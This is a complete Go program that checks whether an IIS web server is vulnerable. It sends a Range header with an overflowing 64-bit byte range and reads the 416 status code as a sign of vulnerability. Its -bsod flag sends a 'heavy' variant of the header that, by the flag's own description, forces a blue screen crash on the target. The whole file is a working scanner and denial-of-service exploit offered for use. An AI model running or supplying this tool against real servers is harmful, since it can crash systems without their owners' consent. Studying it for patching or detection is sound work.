package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
)

const (
	RANGE_HEADER                 = "Range"
	RANGE_LIGHT_TEST             = "bytes=0-18446744073709551615"
	RANGE_HEAVY_TEST             = "bytes=20-18446744073709551615"
	STATUS_RANGE_NOT_SATISFIABLE = 416
	STATUS_INVALID_HEADER_NAME   = 400
)

func main() {
	var addr = flag.String("addr", "", "HTTP address from file to request")
	var bsod = flag.Bool("bsod", false, "Defines whether should force BSOD")
	flag.Parse()

	if len(*addr) == 0 {
		flag.Usage()
		return
	}

	client := &http.Client{}
	req, err := http.NewRequest("GET", *addr, nil)
	if err != nil {
		fmt.Println("Request error:", err)
		return
	}
	if *bsod {
		req.Header.Add(RANGE_HEADER, RANGE_HEAVY_TEST)
	} else {
		req.Header.Add(RANGE_HEADER, RANGE_LIGHT_TEST)
	}

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Send request error:", err)
		return
	}
	defer resp.Body.Close()

	server := resp.Header.Get("Server")
	if len(server) > 0 && !strings.Contains(server, "Microsoft") {
		fmt.Println("[*] Not IIS")
		return
	}

	switch resp.StatusCode {
	case STATUS_RANGE_NOT_SATISFIABLE:
		fmt.Println("[!!] Looks vulnerable")
	default:
		fmt.Println("[*] Looks patched or unaffected")
	}

	if *bsod {
		body, _ := ioutil.ReadAll(resp.Body)
		fmt.Printf("%s\n", body)
	}
}
